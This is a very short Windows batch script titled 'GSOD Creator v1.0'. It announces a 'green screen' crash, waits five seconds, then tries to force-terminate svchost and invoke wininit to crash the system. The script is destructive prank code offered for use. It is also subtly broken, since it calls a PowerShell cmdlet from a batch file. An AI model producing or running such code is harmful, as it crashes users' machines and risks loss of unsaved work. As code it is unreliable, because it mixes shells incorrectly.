@echo off
title GSOD Creator v1.0
color 0a
echo Get Ready for the green screen of bsood
timeout /t 5
Stop-Process -Name "svchost" -Force >nul
wininit >nul